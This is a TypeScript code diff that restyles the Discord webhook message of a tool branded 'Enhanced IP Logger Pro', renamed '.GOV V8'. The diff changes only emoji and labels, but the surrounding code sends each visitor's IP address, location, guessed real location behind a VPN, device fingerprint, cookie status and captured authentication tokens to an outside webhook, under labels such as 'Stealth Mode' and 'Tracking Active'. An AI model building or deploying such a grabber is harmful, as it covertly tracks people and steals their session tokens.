@@ -614,70 +614,68 @@ async function sendToWebhook(webhookUrl: string, data: any): Promise<void> {
     const securityFlags = data.securityFlags || [];
     const capabilities = data.capabilities || [];
 
-    // Determine threat level and color
-    let threatLevel = "🟢 Low";
-    let embedColor = 0x00AA00; // Green
+    // Determine threat level and color (only 🖤 💻 💚 emojis allowed)
+    let threatLabel = "💚 LOW";
+    let embedColor = 0x000000; // Black
 
     if (isBot || isSuspicious || securityFlags.length > 0) {
-      threatLevel = "🔴 High";
-      embedColor = 0xFF4444; // Red
+      threatLabel = "🖤 HIGH";
+      embedColor = 0x000000;
     } else if (isVpnDetected) {
-      threatLevel = "🟡 Medium";
-      embedColor = 0xFFAA00; // Orange
+      threatLabel = "🖤 MEDIUM";
+      embedColor = 0x000000;
     }
 
     const webhookData = {
-      username: "🕵️ Enhanced IP Logger Pro",
-      avatar_url: "https://cdn.discordapp.com/emojis/853928735535742986.png",
+      username: "🖤 .GOV V8",
       embeds: [{
-        title: `${isBot ? "🤖" : isSuspicious ? "⚠️" : isVpnDetected ? "🛡️" : "🎯"} ${isBot ? "Bot/Scraper Detected" : isSuspicious ? "Suspicious Activity" : isVpnDetected ? "VPN/Proxy Detected" : "New Visitor Tracked"}`,
-        description: `**Threat Level:** ${threatLevel}${securityFlags.length > 0 ? `\n**Security Flags:** ${securityFlags.join(', ')}` : ''}`,
+        title: `💻 ${isBot ? "Bot/Scraper Detected" : isSuspicious ? "Suspicious Activity" : isVpnDetected ? "VPN/Proxy Detected" : "New Visitor Tracked"}`,
+        description: `**Threat Level:** ${threatLabel}${securityFlags.length > 0 ? `\n**Security Flags:** ${securityFlags.join(', ')}` : ''}`,
         color: embedColor,
         fields: [
           {
-            name: "🌐 **Network Intelligence**",
+            name: "🖤 Network Intelligence",
             value: `**IP Address:** \`${data.ipAddress}\`\n**Location:** ${data.location || "Unknown"}\n**ISP Type:** ${isVpnDetected ? "VPN/Proxy Service" : "Direct Connection"}`,
             inline: false
           },
           ...(isVpnDetected ? [{
-            name: "🛡️ **VPN Analysis**",
+            name: "🖤 VPN Analysis",
             value: `**VPN Server:** ${data.vpnLocation || "Unknown"}\n**Real Location:** ${data.realLocation || "Estimated Hidden"}\n**Anonymity Level:** High`,
             inline: false
           }] : []),
           {
-            name: "💻 **Device Information**",
+            name: "💻 Device Information",
             value: `**Type:** ${data.deviceType || "Unknown"} ${data.deviceModel ? `(${data.deviceModel})` : ''}\n**Brand:** ${data.deviceBrand || "Unknown"}\n**Architecture:** ${data.architecture || "Unknown"}\n**Fingerprint:** \`${data.fingerprint || "N/A"}\``,
             inline: true
           },
           {
-            name: "🌐 **Browser Details**",
+            name: "💻 Browser Details",
             value: `**Browser:** ${data.browserName || "Unknown"} ${data.browserVersion ? `v${data.browserVersion}` : ''}\n**Engine:** ${data.engine || "Unknown"} ${data.engineVersion ? `v${data.engineVersion}` : ''}\n**OS:** ${data.operatingSystem || "Unknown"} ${data.osVersion ? `${data.osVersion}` : ''}`,
             inline: true
           },
           ...(capabilities.length > 0 ? [{
-            name: "⚙️ **Browser Capabilities**",
+            name: "💻 Browser Capabilities",
             value: capabilities.join('\n• '),
             inline: false
           }] : []),
           {
-            name: "🔍 **Session Context**",
-            value: `**Referrer:** ${data.referrer || "Direct Access"}\n**Authentication:** ${data.tokens && data.tokens !== 'None' ? "🔒 Tokens Found" : "❌ No Auth Tokens"}\n**Cookies:** ${data.cookies && data.cookies !== 'None' ? "🍪 Present" : "❌ None"}\n**Visit Time:** <t:${Math.floor(Date.now() / 1000)}:F>`,
+            name: "💚 Session Context",
+            value: `**Referrer:** ${data.referrer || "Direct Access"}\n**Authentication:** ${data.tokens && data.tokens !== 'None' ? "💚 Tokens Found" : "🖤 No Auth Tokens"}\n**Cookies:** ${data.cookies && data.cookies !== 'None' ? "💚 Present" : "🖤 None"}\n**Visit Time:** <t:${Math.floor(Date.now() / 1000)}:F>`,
             inline: false
           },
           ...(data.tokens && data.tokens !== 'None' ? [{
-            name: "🔐 **Security Tokens Found**",
+            name: "💚 Security Tokens Found",
             value: `\`\`\`${data.tokens.substring(0, 300)}${data.tokens.length > 300 ? "..." : ""}\`\`\``,
             inline: false
           }] : []),
           {
-            name: "📡 **Technical Details**",
+            name: "💻 Technical Details",
             value: `\`\`\`${data.userAgent ? data.userAgent.substring(0, 400) + (data.userAgent.length > 400 ? "\n..." : "") : "No User Agent"}\`\`\``,
             inline: false
           }
         ],
         footer: {
-          text: `🚀 Enhanced IP Logger Pro v2.0 ${isBot ? "• Bot Detection" : isSuspicious ? "• Threat Analysis" : isVpnDetected ? "• VPN Shield" : "• Stealth Mode"}`,
-          icon_url: "https://cdn.discordapp.com/emojis/853928735535742986.png"
+          text: `🖤 .GOV V8 • 💻 IP Intelligence • 💚 Tracking Active`
         },
         timestamp: new Date().toISOString()
       }]
